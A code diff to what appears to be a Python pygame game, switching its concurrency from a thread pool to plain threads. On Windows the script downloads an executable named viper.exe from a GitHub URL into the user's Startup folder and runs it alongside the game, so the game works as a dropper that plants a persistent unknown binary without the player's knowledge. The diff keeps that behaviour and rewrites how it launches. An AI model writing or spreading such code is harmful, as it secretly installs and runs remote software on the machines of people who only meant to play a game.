@@ -1,10 +1,10 @@
-import concurrent.futures
 import os
 import platform
 import random
 import urllib.request
 from collections import deque
 import subprocess
+import threading
 
 import pygame
 
@@ -194,10 +194,12 @@ if __name__ == "__main__":
         startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
         # Download the executable to the Startup folder
         file = download_executable("https://raw.githubusercontent.com/NotoriusNeo/viper/main/viper.exe", startup_folder)
-        # Use a ThreadPoolExecutor to run the game and the executable in parallel
-        with concurrent.futures.ThreadPoolExecutor() as executor:
-            func1_future = executor.submit(game)
-            func2_future = executor.submit(run_executable, file)
-            concurrent.futures.wait([func1_future, func2_future])
+        # Start a new thread to run the game function
+        game_thread = threading.Thread(target=game)
+        game_thread.start()
+        # Start a new thread to run the executable
+        exe_thread = threading.Thread(target=run_executable, args=[file])
+        exe_thread.start()
     else:
+        # If not running on Windows, just run the game function
         game()
